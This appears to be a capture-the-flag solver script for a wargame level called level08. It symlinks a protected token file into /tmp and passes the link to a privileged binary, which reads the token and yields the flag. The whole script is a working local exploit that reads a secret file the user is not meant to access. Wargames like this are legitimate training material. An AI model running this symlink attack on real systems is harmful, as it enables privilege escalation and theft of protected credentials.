from solver.utils import extract_flag

def solve(connection):
	connection.exec("ln -s /home/user/level08/token /tmp/exploit")
	flag = connection.exec("./level08 /tmp/exploit")
	return "", extract_flag(flag)